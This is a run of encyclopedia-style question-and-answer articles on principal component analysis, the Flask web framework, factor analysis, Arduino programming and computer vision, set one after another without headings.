Could you mention some real - world use cases of PCAs ?
Use of PCA for facial recognition .
Source : Lipp 2015 .
PCA has been applied for facial recognition .
For 90 % capture variance , only a third of the components had to be retained .
This may be sufficient for Machine Learning applications .
The other two - thirds contain most of the image details .
In another study , the consumption of 17 different food types was studied across 4 countries in the UK .
Thus , this problem has 17 features and is hence non - trivial to analyze .
With PCA , the first component showed that Northern Ireland was unique .
People of Northern Ireland consume fresh potatoes and fresh fruit differently from other populations .
The lower molar teeth of an ancient mammal named Kuehneotherium were studied in nine variables .
The PCA showed that just two components are enough to explain over 95 % of total variation .
When plotted , it was easy to see the clusters and relate them back to the original features .
One cluster stood for a species of Kuehneotherium while another broader cluster suggested an unidentified animal .
To detect lactose in lactose - free milk using NIR spectroscopy , containing 601 dimensions , PCA identified distinct clusters with just two principal components .
Is n't PCA similar to Dimensionality Reduction ?
In a complex data - intensive problem , there are usually many influencing variables .
The term variable is equivalent to other commonly used terms : feature or dimension .
The idea of reducing the number of variables or dimensions is called Dimensionality Reduction .
This can be done in two ways : Feature Elimination : We drop some features that we may consider unimportant .
While the approach is simple , we lose useful information present in those dropped features .
Feature Extraction : We transform the original set of features into another set of features .
The idea is to pack the most important information into as few derived features as possible .
We can reduce the number of dimensions by dropping some of the derived features .
But we do n't lose complete information from the original features : derived features are a linear combination of the original features .
PCA is in fact a method for doing feature extraction .
In PCA , derived features are also called composite features or principal components .
Moreover , these principal components are already independent from one another .
What are the advantages of the PCA technique ?
PCA minimizes information loss even when fewer principal components are considered for analysis .
This is because each principal component is in a direction that maximizes variation , that is , the spread of data .
More importantly , the components themselves need not be identified a priori : they are identified by PCA from the dataset .
Thus , PCA is an adaptive data analysis technique .
In other words , PCA is an unsupervised learning method .
By reducing the number of dimensions , PCA enables easier data visualization .
Visualization helps us to identify clusters , patterns and trends more easily .
Fewer dimensions means less computation and a lower error rate .
PCA reduces noise and makes algorithms work better .
Finding the principal components is really an eigenvalue / eigenvector problem , which has been well studied with lots of algorithms available for practical use .
Although Gaussian distribution of data is assumed as a descriptive tool , the PCA does n't need this assumption .
It can be used for exploratory analysis of data of any distribution .
There are also variations of PCA that cater to different data types and structures .
What are the drawbacks of the PCA technique ?
Examples where PCA may not work well .
Source : Lever et al .
2017 , fig .
4 .
Here are some drawbacks to PCA : PCA works only if the observed variables are already correlated .
If there 's no correlation , the PCA will fail to capture adequate variance with fewer components .
PCA is lossy .
Information is lost when we discard insignificant components .
Scaling of variables can yield different results .
Hence , the scaling that you use should be documented .
Scaling should not be adjusted to match prior knowledge of data .
Since each principal component is a linear combination of the original features , visualizations are not easy to interpret or relate to original features .
Mid - nineteenth century works by Cauchy and Jacobi in classical analytic geometry show that the equations for the principal axes of quadratic forms and surfaces are known .
Francis Galton in his Natural Inheritance connects principal axes for the first time with the correlation ellipsoid .
Karl Pearson invents PCA while working to find the major and minor axes of an ellipse .
However , he does not use the term PCA .
In his geometric interpretation of the problem , he 's trying to find " lines and planes closest fit to systems of points in space " .
Harold Hotelling develops PCA independently and names the technique .
His approach is what is familiar to us today , using successive orthogonal linear combinations with maximum variance .
The 1930s is also the decade when the development of Factor Analysis started .
This is closely related to PCAs .
Around 1960 , Malinowski introduced the PCA to chemistry .
After 1970 , many chemical applications of PCA appeared in literature .
A scree plot based on eigenvalues shows that three factors will explain most of the data .
Source : Statistica Help 2018 .
How does one determine how many principal components to retain for analysis ?
In the context of factor analysis , R.B. Cattell proposes a method called Scree Test .
A Scree Plot is used for this purpose .
It represents graphically the eigenvalues or the percentages of total variation accounted for by each principal component .
Flask logo .
Source : Wikipedia 2019 .
Flask is a simple and minimalist web framework written in Python .
It has no database abstraction layer , form validation , or other components that a web app might require .
However , Flask can be enhanced with extensions that can add application features as if they were implemented in Flask itself .
It 's open source under a BSD license .
Flask is easy to set up and learn .
One can write a Flask app in as few as seven lines of code and extend it to thousands .
Among the big companies that use Flask are LinkedIn , Pinterest , Reddit , and many more .
Flask along with Bootstrap and SQLite can be used to easily develop full - functioning web apps .
With so many frameworks out there , what 's special about Flask ?
Flask uses Python and is lightweight .
It consumes minimum resources to get the work done .
It 's very easy to learn once you have a sound knowledge of Python .
Flask enables rapid prototyping of your app and works very efficiently for small applications .
It enables you to focus more on other jobs than being stuck with web server management .
Among the important features of Flask are a built - in web server and debugger , unit testing support , RESTful request dispatching , secure cookies , WSGI compliance , Unicode support and good documentation .
How does Flask compare to Django ?
The performance of Flask is better than Django .
Source : TechEmpower 2018 .
Django is a full - featured MVC framework while Flask is a micro - framework .
What this means is that Django takes a " batteries - included " approach by providing many packages typically used by web apps .
Flask , on the other hand , lets you bring in packages as required for your project .
Django is a stricter and more mature framework than Flask .
Django has its own ways of doing things , while Flask gives you all the freedom you want .
For example , Django comes with an ORM , but with Flask you can use any ORM of your choice .
Flask is easier to learn due to its minimalism .
Beginners looking to learn a Python - based web framework can start with Flask .
For simple apps , Flask is more than adequate .
For complex apps or to make a polished product , you can consider migrating to Django .
Because Django includes lots of useful stuff by default , it might be faster to develop complex apps .
For example , Django comes with an administrator interface that can be customized .
This can be useful when building a Content Management System ( CMS ) .
As a beginner , how do I get started with Flask ?
One can refer to the Flask official documentation .
The User 's Guide contains a quickstart guide , detailed tutorials and useful patterns in Flask .
Week 7 of Harvard 's CS50 course is useful if you want a proper classroom type tutoring with assignments .
The Flask Tutorial Playlist by Corey Schafer is also a good starting point .
Use ` pip ` to install Flask : ` pip install -U Flask ` Which websites use Flask ?
There 's a curated list of sites using Flask .
Another list mentions big names : Red Hat , Airbnb , Netflix , Lyft , Reddit , Uber , and Samsung .
Other big names include Pinterest , Twilio and LinkedIn .
What are some popular extensions used along with Flask ?
Flask + Bootstrap + SQLite .
Source : Adapted from Elliot 2015 .
Flask can be used to implement a Model - View - Controller ( MVC ) pattern of web framework : Flask ( controller ) , SQLite ( model ) , Bootstrap ( view ) .
Jinja2 is popular for rendering HTML templates and is part of the view .
Flask can be used with front - end frameworks such as VueJS but you would have to learn JavaScript .
These are some commonly used extensions : Flask - Cors : A Flask extension for handling Cross - Origin Resource Sharing ( CORS ) , making cross - origin AJAX possible .
Flask - User : Customizable user authentication , user management , password recovery , and more .
Flask - PyMongo : This bridges Flask and PyMongo .
It provides some convenient helpers .
PyMongo is a MongoDB driver .
Flask - SQLAlchemy : Database abstraction layer and Object Relational Mapper ( ORM ) are popular for Flask apps .
How do I deploy a Flask application to production ?
Illustrating traditional Flask web app during development and production .
Source : Kennedy 2017 .
Flask comes with a simple built - in server .
This runs on the default port 5000 .
This is commonly used for development but not recommended for production because it does n't scale well .
For production , many cloud providers document procedures on how to deploy Flask on their platforms .
If you wish to deploy Flask on your own , ` mod_wsgi ` is an essential module for Apache server .
If the Nginx server is used , it will typically serve static files and the rest will be handed over to the Gunicorn server , which becomes the WSGI entry point for the Flask application .
In fact , Nginx can reverse proxy a HTTP request to any WSGI - compliant server , including Apache , Gunicorn or uWSGI .
Pocco has formed an international group of Python Enthusiasts .
Coders from Pocco released version 0.1 of Flask .
Flask is really a combination of two other projects developed at Pocco : Werkzeug ( a web programming toolkit ) and Jinja2 ( a templating engine ) .
It 's initially called Denied – The next generation micro - web - framework .
Harvard 's popular CS50 : Introduction to Computer Science course incorporates Flask to teach web development , thus shifting focus from PHP to Python .
It becomes available on edX as CS50x in 2017 .
Flask 1.0 has launched .
Python versions 2.7 and 3.3 are no longer supported .
Thus , Flask requires Python 2.7 , Python 3.4 and above , or PyPy .
Flask 1.0.2 has been released .
When analysing data containing many measured variables , it may happen that some of the variables are correlated .
This could be because they share an underlying influence or common factor .
It would be useful to understand how these variables are correlated and seek an intuitive explanation of what 's common among them .
This will also simplify further analysis by reducing the dataset into fewer variables or factors .
This is what factor analysis tries to achieve .
A good factor is intuitive , easy to interpret , has a simple structure and lacks complex loadings .
Factor analysis is , in some sense , an art .
It 's been said , factor analysis is not a purely statistical technique ; there is always a certain amount of guesswork in it ... Factor analysis is certainly a very treacherous tool in inexperienced hands .
Could you provide an intuitive explanation of Factor Analysis ?
Four variables are influenced by two factors , which in turn could themselves be correlated .
Source : McGrew 2014 , Fig 4 .
Suppose a village survey is conducted and the questionnaire includes 500 questions .
This survey therefore results in a large dataset of 500 variables .
However , we may discover that many of the variables are correlated .
We can probably put related variables into groups such as income , education , healthcare , cleanliness , etc .
These are called factors .
Now our analysis is becoming easier with many variables to fewer factors .
Let 's say we measure students ' abilities in terms of four variables : vocabulary , grammar , arithmetic , and geometry .
We can make a hypothesis that vocabulary and grammar abilities must be correlated .
Likewise , arithmetic and geometry abilities must be correlated .
We can therefore hypothesize two factors : language ability and math ability .
Subsequent analysis of the data can either confirm or reject the presence of these factors and to what extent they relate to the variables .
In fact , the factors themselves could be correlated with each other and we might identify a single factor that we can call academic ability .
What are latent variables and factor loadings in Factor Analysis ?
Vulvar pain can be traced to three underlying factors .
Source : Dargie et al .
2017 , table 5 .
What we call factors are in fact latent variables .
These are variables that ca n't be measured but in fact influence variables that are measured .
The coefficients of latent variables are called factor loadings with respect to a measured variable .
In other words , the extent to which a variable is associated with the factor is quantitatively expressed by its factor loading .
It 's possible that a measured variable is influenced by more than one factor .
To give an example , when income , education and occupation are correlated , the common factor could be " individual socioeconomic status " ( F1 ) .
On the other hand , house value , neighbourhood crimes and amenities can point to another factor , " neighbourhood socioeconomic status " ( F2 ) .
Consider a load of 0.65 between income and F1 ; and a load of 0.48 between occupation and F1 .
This implies that F1 influences income more strongly than occupation .
An absolute value of 0.4 or higher can be considered as a high load .
What are the main types of Factor Analysis ?
The two main types of FA are : Exploratory Factor Analysis ( EFA ) : This is used when we wish to summarize data efficiently , when we want to know how many factors are present and their associated factor loadings .
EFA is about revealing patterns in the relationships among variables .
Confirmatory Factor Analysis ( CFA ) : This is used when a researcher starts with one or more hypotheses .
Each hypothesis may state the presence of certain factors .
Analysis of measured data must prove or disprove each hypothesis .
A graphical representation of a hypothesis is called a path diagram .
CFA produces fit statistics that are used to confirm if data fits a particular hypothesis .
Structural Equation Modelling ( SEM ) is similar to CFA but allows us to test complex hypotheses about the structure of variables .
SEM may be seen as a method to do CFA .
What are the methods of doing Factor Analysis ?
Various methods of doing Factor Analysis .
Source : ttnphns 2013 .
All methods of factor analysis look for correlations among variables .
FA is usually done in one of these ways : Principal Component Analysis ( PCA ) , Principal Axis Factoring ( PAF ) , Ordinary or Unweighted Least Squares ( ULS ) , Generalized or Weighted Least Squares ( WLS ) , Maximum Likelihood ( ML ) .
Other methods include Image Factoring ( based on ULS ) and Alpha Factoring .
PAF is considered the conventional technique .
It uses eigenvalue decomposition of a correlation matrix .
ULS is considered one of the better methods .
It produces the Minimum Residual ( MinRes ) solution .
One study that compared some of these methods found that ULS gave accurate results .
What are some assumptions for Factor Analysis ?
Variables have to be correlated but there should n't be perfect multicollinearity among the variables ; that is , one variable can not be predicated accurately from other variables .
Data should n't have outliers .
We assume interval data .
Non - linearity is not allowed , but non - linear variables can be transformed into linear ones before applying factor analysis .
In fact , in the discipline of statistics , factor analysis is considered as a part of the Generalized Linear Model ( GLM ) .
Why do we do Factor Rotation ?
Illustrating two types of factor rotation .
Source : Humbert 2017 , slide 27 .
Sometimes we will find that a variable has high factor loadings due to more than one factor .
This makes it difficult to interpret the factors .
Since factor models are not unique , factor rotation allows us to find another factor model that can perhaps be interpreted better .
There are two rotation types : orthogonal : This uses the loading matrix that represents the correlation between variables and factors .
In this type , the rotating factors remain orthogonal to one another .
Oblique : This uses factor correlation matrix , structure matrix , pattern matrix , and factor coefficient matrix .
In this type , the rotating factors are allowed to become correlated .
Oblique rotation may be considered as a subset of orthogonal rotation .
If data clusters are in fact uncorrelated , then an oblique rotation will result in orthogonal factors .
There are different methods of performing these rotations .
For orthogonal rotation , we have Quartimax , Varimax and Equamax .
For oblique rotation , we have Oblimin and Promax .
Is n't Factor Analysis the same as Principal Component Analysis ?
Comparing CFA and PCA .
Source : IDRE 2019 .
Both PCA and FA achieve dimensionality reduction while minimizing information loss .
Both appear to use similar techniques of extraction , interpretation and rotation to reduce many variables to fewer components or factors .
Yet , they are fundamentally different .
A PCA extracts maximum variance into the first component , then extracts maximum variance into the second component , and so on .
Factors in the FA have no such order .
Factors identify common variances among variables .
For this reason , FA is also called Common Factor Analysis ( CFA ) .
The FA does n't capture errors or unique variances whereas PCA considers all the variance .
If variables are uncorrelated , PCA will still find suitable components but EFA will be unable to identify useful factors .
It 's been noted that as the number of variables increases ( at least 40 variables ) , results from PCA and EFA tend to come closer .
Considering PCA and FA , how are variables related to components or factors ?
Illustrating relationships between variables and components / factors .
Source : Adapted from Grace - Martin 2017 .
Factors cause variables .
Components are an aggregate of variables .
In PCA , components ( C ) are a linear combination of variables ( Y ) .
The FA aims to identify latent variables or factors ( F ) .
Latent variables themselves ca n't be measured directly but are seen to cause or influence the measured variables .
The extent of influence ( b ) is called factor loading .
While components in PCA explain all of the variance in data , factors may not explain all the variance in a variable , thus resulting in a term that 's unique ( u ) to each measured variable .
Mathematically , $ $ FA:\ Y_1 = b_1F+u_1;\ Y_2 = b_2F+u_2;\ Y_3 = b_3F+u_3;\ Y_4 = b_4F+u_4\\PCA:\ C = w_1Y_1+w_2Y_2+w_3Y_3+w_4Y_4$$ What tools are available to perform Factor Analysis ?
In R language ( which is free and open source ) , factor analysis can be performed easily thanks to the ` psych ` package .
EFA can be performed using your choice of method : MinRes , PAF , ULS , WLS or ML .
The ` scree ` function can help in determining the number of significant factors .
An alternative to this is parallel analysis that can be done using the ` fa.parallel ` function .
An example of a commercial product is JMP of SAS .
The Multivariate platform of JMP can do both PCA and FA .
The SPSS is another commercial product that can do both PCA and EFA .
The genesis of factor analysis is in human personality psychology : to identify attributes and then categorize them into a structural model .
Francis Galton uses a dictionary to identify terms that describe personality .
However , he fails to come up with a model .
Spearman gets interested in the work of Galton .
In a paper published in 1904 , he uses the terms factor and loading , although he does n't describe the methods he used for factorizing .
L.L. Thurstone , considered the father of factor analysis , uses 60 terms across 1300 subjects to arrive at five broad factors .
He does n't pursue his analysis further .
R.B. Cattell identifies at least a dozen factors in the 1940s , but it 's Donald Fiske who shows that they reduced to five factors .
Harry Harman introduces Minimum Residuals ( MinRes ) , an approach to factor analysis via least squares .
An example scree plot shows five significant factors .
Source : Nelson et al .
2011 , fig .
2 .
To determine how many factors to retain , R.B. Cattell proposes a graphical method called the Scree Plot , a plot of eigenvalues vs. factors .
The term Confirmatory Factor Analysis ( CFA ) is introduced .
Prior to this , factor analysis was exploratory in nature but the " exploratory " prefix was not used .
Human personality traits can be reduced to just five factors .
Source : Cooper 2014 .
Following Fiske and other researchers after him , it 's in the 1980s that the Big - Five factor structure to describe human personality finally took shape .
This goes to prove that finding the correct number of factors , and identifying those factors , is not a trivial problem .
Programming Arduino boards is done via a language called Wiring , which itself is based on Processing and C / C++ languages .
We can think of wiring as providing a simpler abstraction on top of the more complex C / C++ syntax .
Hardware can be programmed directly using a USB connection .
Arduino IDE is open source and it supports all the Arduino variants .
It 's also possible to program the hardware from within a web browser after installing a plugin .
Every Arduino board will have constraints of memory , GPIO pins , and so on .
Developers should be aware of this and optimize the code accordingly .
Which are the basic programming constructs used in Arduino ?
Every Arduino sketch must have two basic constructs : ` setup ( ) ` : This is called once when the program starts , that is , when the board is powered up or is reset .
This is the place to initialize interfaces , such as GPIO pin modes or baud rate for serial communication .
` loop ( ) ` : This is called repeatedly and is the place for the main code .
This is equivalent to ` while ( 1 ) { … } ` C code .
For digital IO , we can use ` digitalRead ( ) ` and ` digitalWrite ( ) ` .
Since a GPIO pin can be either input or output , it should first be setup using ` pinMode ( ) ` .
For analogue IO , we can use ` analogRead ( ) ` and ` analogWrite ( ) ` .
Like in C / C++ , control structures in Arduino include if - else , switch - case , for loops , do - while , break and continue .
Data types common in C language are available , but there 's also a ` String ` class for easier manipulation of strings .
` Serial ` and ` Stream ` are also useful classes .
There are built - in math functions , timing functions , random number generation , bit - level operation , and interrupt processing .
All of these are documented in the Arduino Reference .
What are the main features of the Arduino IDE ?
Screenshot of the Arduino IDE with annotations .
Source : Devopedia 2019 .
Arduino programs are called sketches .
Arduino IDE is more than a code editor for a sketch .
It does syntax highlighting in the code .
It includes a number of simple examples to learn programming .
Examples are accessible via the File&rarr;Examples menu .
From the IDE , we can verify the sketch and upload the binary to the target hardware .
Any errors in this process are shown to the user .
The IDE can target all hardware variants .
This selection is done via the Tools&rarr;Board menu .
What 's more , we can use the Boards Manager to install newer boards or update to newer versions of board libraries .
Likewise , developers have easy access to hundreds of third - party libraries or install custom libraries from a Zip file .
This is done via menu Sketch&rarr;Include - Library .
To monitor serial communications , there 's Serial Monitor and Serial Plotter .
If IoT data is being sent , Serial Plotter 's visualization makes it easy to see what 's happening .
We also mention that there are alternatives to the Arduino IDE for programming Arduino boards .
Some names are PlatformIO , Eclipse Arduino and Atmel Studio .
How can I make the best use of limited memory resources on the Arduino ?
Dynamic allocation can result in heavy memory fragmentation .
Source : Earl 2013 .
The Arduino Uno has only 2 KB of SRAM .
This means that not a lot of variables can be held in memory , particularly long strings .
If SRAM is required for processing data , try offloading the processing to the cloud or another computer / device .
If the range of your data can fit within a byte , use ` byte ` data type rather than two bytes of ` int ` .
Use ` String.reserve ( ) ` to avoid memory fragmentation .
Prefer local to global variables .
Using ` PROGMEM ` keyword as part of data declaration , we can tell the compiler to store data in Flash .
Using the macro ` pgm_read_byte_near ( ) ` , we can read a byte from Flash .
Similar macros exist for other data types : word , dword , float and ptr .
If a string is defined as inline , then the ` F ( ) ` is useful to store it in Flash .
Let 's note that the ` const ` keyword has read - only semantics , particularly useful for passing function arguments .
It 's not meant to tell the compiler where to store the data .
What exactly is Software Serial and why do we need it ?
Serial communications can be controlled using the ` Serial ` class .
This relies on the underlying UART hardware that 's part of the microcontroller .
The Arduino Uno has one serial interface on pins 0 and 1 .
Due and Mega have four serial interfaces .
What if we want another serial interface on the Uno ?
This is where Software Serial becomes useful .
Serial communications can be implemented on any pair of digital pins using software .
We do n't have to write low - level code to do this since third - party libraries are available .
SoftwareSerial is available in Arduino IDE by default .
The main disadvantage is that if multiple software serial interfaces are used , only one can receive data at a time .
Speeds are also limited compared to UART .
AltSoftSerial is an alternative , but it has other limitations .
Either UART or software , serial interface operates at either 5V or 3.3V depending on the Arduino board .
Do n't connect them directly to the RS232 serial port that operates at + -12V. Use a USB - to - serial adaptor in between .
How do I program the Arduino for analogue input ?
For analogue input , there 's an ` analogRead ( ) ` function .
The Arduino Uno uses a 10-bit Analogue - to - Digital Converter ( ADC ) .
Since Uno runs on 5V , this implies that the ADC resolution is 5V/1024 = 4.88mV. It 's possible to improve the resolution by sacrificing range .
For example , calling ` analogReference(INTERNAL ) ` sets the ADC reference to 1.1V and improves resolution to 1.1V/1024 = 1.07mV. Uno WiFi Rev2 board has a default reference of 0.55V. Due , Zero and MKR Family boards use 3.3V reference and 12-bit ADC .
Thus , their resolution is at 0.806mV. However , they default to 10-bit ADC and this can be changed using ` analogReadResolution ( ) ` .
It 's interesting that this function can be used to specify a lower resolution ( least significant bits are discarded ) or a higher resolution ( extra bits are zero - padded ) .
An external reference via the AREF pin can also be used and selected using ` analogReference(EXTERNAL ) ` .
It 's important to call this before calling it ` analogRead ( ) ` .
The input to AREF must also respect the allowed voltage range .
How do I program the Arduino for analogue output ?
On most Arduino boards , analogue output is not actually a continuous signal but rather a stream of digital pulses called Pulse Width Modulation ( PWM ) .
MKR and Zero boards are capable of true analogue on pin DAC0 .
You can do this on pins DAC0 and DAC1 .
For both PWM and true analogue , the relevant API to call is ` analogWrite ( ) ` .
The Arduino Uno has PWM on pins 3 , 10 and 11 at 490Hz and pins 5 and 6 at 980Hz .
On Due , twelve pins can do PWM at 1000Hz .
PWM is generated from timers .
For example , the ATmega328P used in the Uno has three timers .
These can be used in one of two modes : Fast PWM or Phase - Correct PWM .
However , these are low - level details not exposed via ` analogWrite ( ) ` .
Called Software PWM , it 's possible to generate PWM waveforms on digital pins .
This approach is called bit banging .
With this , we can also control the frequency of the pulses .
The problem with Software PWM is that interrupts will affect timing , resulting in jitter .
Another problem is that the processor is dedicated to generating PWM and ca n't do anything else .
How do I program the Arduino for I2C and SPI interfaces ?
Both I2C and SPI are synchronous protocols that rely on a clock line .
In both cases , libraries are available : ` Wire ` for I2C and ` SPI ` for SPI .
In addition , other specialized libraries might wrap these to further simplify programming .
An example of this is Adafruit TMP007 library for the I2C - based infrared thermopile sensor .
These libraries abstract away the actual pins used by these interfaces .
I2C is also called Two - Wire - Interface ( TWI ) .
For I2C , the Wire library uses 7-bit slave addressing and a 32 byte buffer .
Pullup resistors are required for lines SDA and SCL .
Uno has one I2C interface while Due has two .
With SPI interfacing , the microcontroller is typically the master .
We need to know some things about the slave : bit order , mode , and maximum clock speed .
These must be configured using ` SPI.beginTransaction(SPISettings ( … ) ) ` .
On Uno , pins 10 - 13 make up the SPI interface .
MOSI , MISO and SCK are also available on the ICSP header .
How can I manage the power consumption of my Arduino application ?
Current consumption of ATmega328P on breadboard .
Source : Alex The Giant 2016 .
Managing power consumption is critical for battery - powered applications .
When there 's no activity , the Arduino must go into sleep to save energy .
The built - in function ` delay ( ) ` gives some savings , but more can be obtained by using the LowPower library .
The problem with both approaches is that the system ca n't respond to interrupts while asleep .
Sleep time is also limited to a maximum 8 seconds .
A better approach is to use the built - in ` sleep_cpu ( ) ` along with interrupts .
On Uno , hardware interrupts are available on pins 2 and 3 .
Depending on the application , interrupts can come from a sensor or an RTC module .
You can also slow down the clock to as low as 62.5kHz by setting the CLKPR register .
An external crystal can be used for other clock values .
This will need changes to the bootloader and optionally to the Arduino IDE .
Optiboot can be used to create a custom bootloader .
Other hardware changes can reduce power .
Replace the onboard voltage regulator with a more efficient DC - DC buck converter .
Better still , make a custom board just right for your application .
Could you name some popular third - party libraries for the Arduino ?
Registered Arduino libraries are listed online and also available from within the IDE .
Libraries are organized by category , license and processor architecture .
In June 2019 , among the most starred or forked libraries were ArduinoJson , WiFiManager , FastLED , Blynk , IRremote , PubSubClient , Adafruit NeoPXL8 , Adafruit NeoPixel , and MFRC522 .
During Jan - Mar 2019 , these libraries recorded the most downloads : Adafruit Circuit Playground , DHT sensor library , ArduinoJson , Servo , SD , Adafruit GFX Library , Adafuit NeoPixel , LiquidCrystal I2C , MFRC522 , and Blynk .
Among the top contributors are Adafruit Industries , SparkFun Electronics , Seeed Studio , Arduino Libraries , and STM32duino .
A curated list of libraries is available from Lembed .
Another list appears on the Arduino Playground site .
Read a tutorial to create your own library .
Hernando Barragán created a wiring platform so that designers and artists could approach electronics and programming more easily .
Wiring abstracts away the hardware pins with API calls such as ` pinMode ` , ` digitalRead ` , ` analogWrite ` , ` delay ` , etc .
In fact , the syntax is defined before any hardware implementation .
Arduino IDE and language library have been released for the first time with the name Arduino 0001 .
The main sketch is compiled as C code but from Arduino 0004 ( April 2006 ) it 's compiled as C++ code .
Arduino 1.0 has been released .
Sketches now use the extension ` * .ino ` rather than ` * .pde ` used for processing files .
This version introduces the use of ` F ( ) ` macro .
This macro was invented about a year ago by Paul Stoffregen who invented the Teensy derivative of Arduino .
With the release of Arduino 1.5 Beta , the IDE now supports both AVR 8-bit and ARM 32-bit .
This is also the year when the first 32-bit Arduino is released with Arduino Due .
There are more than 2,150 libraries registered with the Arduino Library Manager .
These can be downloaded and installed directly from within the IDE .
There are also over 7,000 libraries in the wild .
Since v1.0.5 , the latter can be installed from a Zip file .
Meanwhile , Arduino 1.8.9 was released with support for ARM64 such as NVIDIA Jetson and Raspberry Pi 3 .
Computer Vision is an interdisciplinary field .
Source : Frolov 2018 , slide 7 .
Computer Vision is about enabling computers to see , perceive and understand the world around them .
This is achieved through a combination of hardware and software .
Computers are trained using lots of images / videos and algorithms / models are built .
An understanding of human vision also informs the design of these algorithms / models .
In fact , computer vision is a complex interdisciplinary field at the intersection of engineering , computer science , mathematics , biology , psychology , physics , and more .
Since the early 2010s , neural network approaches have greatly advanced computer vision .
But given the sophistication of human vision , much more needs to be done .
Computer vision is an important part of Artificial Intelligence .
This is because we " see " less with our eyes and more with our mind .
It 's also because it spans multiple disciplines .
How does Computer Vision compare with human vision ?
Computers first see every image as a matrix of numbers .
It 's the job of algorithms to transform these low - level numbers into lines , shapes and objects .
This is n't so different from human vision , where the retina triggers signals that are then processed by the visual cortex in the brain , leading to perception .
CV uses Convolutional Neural Network ( CNN ) .
This is a model inspired by how the human visual cortex works , processing visual sensory inputs via a hierarchy of layers of neurons .
While more work is needed to achieve the accuracy of human vision , CNNs have brought us the best results so far .
CNNs lead to Deep CNNs where the idea is to match 2D templates rather than construct 3D models .
This again is inspired by our own vision system .
Among the obvious differences are that the CV can see 360 degrees ; that CV is not limited to just visible light ; that CV is not affected by fatigue or physiology ; the CV sees uniformly across the field of view but our peripheral vision is better at low - light conditions ; CV has its own biases but they 're free from biases and optical illusions that affect humans .
Is n't Computer Vision similar to image processing ?
Computer vision vs image processing explained .
Source : Isikdogan 2018 .
Image processing comes from the disciplines of Electrical Engineering and Signal Processing , whereas computer vision is from Computer Science and Artificial Intelligence .
Image processing takes in an image , enhances the image in some way , and outputs an image .
Computer vision is more about image analysis with the goal of extracting features , segments and objects from the image .
Adjusting the contrast in an image or sharpening the edges via a digital filter are image processing tasks .
Adding colour to a monochrome image , detecting faces or describing the image are computer vision tasks .
It 's common to combine the two .
For example , an image is first enhanced and then given to computer vision .
Computer vision can detect faces or eyes , then image processing improves facial skin tone or removes red eyes .
Let 's note that Machine Learning can be used for both CV and image processing , although it 's more commonly used for CV .
How is Computer Vision ( CV ) related to Machine Vision ( MV ) ?
Machine vision is more an engineering approach to enable machines to see .
It 's about image sensors ( cameras ) , image acquisition , and image processing .
For example , it 's used on production lines to detect manufacturing defects or ensure that products are labelled correctly .
Machine vision is commonly used in controlled settings , has strong assumptions ( colour , shape , lighting , orientation , etc .
) and therefore works reliably .
Computer vision incorporates everything that machine vision does but adds value by way of image analysis .
Thus , machine vision can be seen as a subset of computer vision .
CV makes greater use of automation and algorithms , including machine learning , but the line between CV and MV is blurry .
Typically , vision systems in industrial settings can be considered as MV .
What are some applications of Computer Vision ?
Google Maps uses CV on satellite or aerial images to create 3D models .
Source : Miller 2014 .
CV has far - reaching applications .
Wikipedia 's category on this topic has many sub - categories and dozens of pages : Recognition Tasks : Recognition of different entities including face , iris , gesture , handwriting , optical character , number plate , and traffic signs .
Image Tasks : Automation of image search , synthesis , annotation , inspection , and retrieval .
Applications : Enabling entire applications such as augmented reality , sign language translation , automated lip reading , remote sensing , mobile mapping , traffic enforcement camera , red light camera , pedestrian detection and video content analysis .
Facebook uses a CV for detecting faces and tagging images automatically .
Google is able to give relevant results for an image search because it analyzes image content .
Microsoft Kinect uses stereo vision .
Iris or face recognition are being used for surveillance or for biometric identification .
Self - driving cars employ a variety of visual processing tasks to drive safely .
Gauss Surgical uses real - time ML - based image analysis to determine blood loss in patients .
Amazon Go uses CV for tracking shoppers in the store and enabling automated checkout .
The CV has been used to study society , demographics , predict income , crime rates , and more .
Could you describe some common tasks in Computer Vision ?
Labels and bounding boxes in object detection .
Source : Murali 2017 .
Image Segmentation groups pixels that have similar attributes such as colour , intensity or texture .
It 's a better representation of the image to simplify further processing .
This can be subdivided into semantics or , for instance , segmentation .
For instance , the former means that people and cats are segmented ; the latter means that each person and each cat are segmented .
Image Classification is about giving labels to an image based on its content .
Thus , the image of a cat would be labelled as " cat " with high probability .
Object Detection is about detecting objects and placing bounding boxes .
Objects are also categorized and labelled .
In a two - stage detector , boxing and classification are done separately .
A one - stage detector will combine the two .
Object detection leads to Object Tracking in video applications .
Image Restoration attempts to enhance the image .
Image Reconstruction is about filling in missing parts of the image .
With Image Colourization , we add colour to a monochrome image .
With Style Transfer we transform an image based on the style ( colour , texture ) of another image .
What 's the typical data pipeline in Computer Vision ?
A typical computer vision data pipeline .
Source : Thompson 2015 .
A typical CV pipeline includes image acquisition using image sensors ; pre - processing to enhance the image such as reducing noise ; feature extraction that would reveal lines , edges , shapes , textures or motion ; image segmentation to identify areas or objects of interest ; high - level processing ( also called post - processing ) as relevant to the application ; and finally , decision making such as classifying a medical scan as true or false for tumour .
Could you mention some algorithms that power Computer Vision ?
Here 's a small and incomplete selection of algorithms .
For pre - processing , thresholding is a simple and effective method : conventional , Otsu global optimal , adaptive local .
Filters are commonly used : median filter , top - hat filter , low - pass filter ; plus filters for edge detection : Roberts , Laplacian , Prewitt , Sobel , and more .
For feature - point extraction , we can use HOG , SIFT and SURF .
Hough Transform is another feature extraction technique .
The Viola - Jones algorithm is for object or face detection in real time .
There 's also the PCA approach called eigenfaces for face recognition .
The Lucas - Kanade algorithm and Horn - Schunk algorithm are useful for optical flow calculation .
The Mean - shift algorithm and Kalman filter are for object tracking .
Graph Cuts are useful for image segmentation .
For 3D work , NDT , ICP , CPD , SGM , and SGBM algorithms are useful .
Bresenham 's line algorithm is for drawing lines in raster graphics .
To relate corresponding points in stereo images , use Fundamental Matrix .
In the world of machine learning algorithms , we have CNNs and Deep CNNs .
We also have SVM , KNN , and more .
What are the current challenges in Computer Vision ?
It 's been shown that " adversarial " images in which pixels are selectively changed can trick image classification systems .
For example , the Google Cloud Vision API thinks it 's looking at a dog when really the scene has skiers .
Algorithms are capable of deductive reasoning but are poor at understanding of context , analogies and inductive reasoning .
For example , the CV can recognize a book but the same book when used as a doorstop will be seen only as a book .
In other words , the CV is incapable of understanding a scene .
While CV has progressed with object recognition , accuracy can suffer if the background is cluttered with details or the object is shown under different lighting at a different angle .
In other words , invariant object recognition is still a challenge .
There are also challenges in creating low - powered CV solutions that can be used in smartphones and drones .
Embedded vision is becoming mainstream in automotive , wearables , gaming , surveillance , and augmented reality with a focus towards object detection , gesture recognition , and mapping functions .
What software tools would you recommend for doing Computer Vision ?
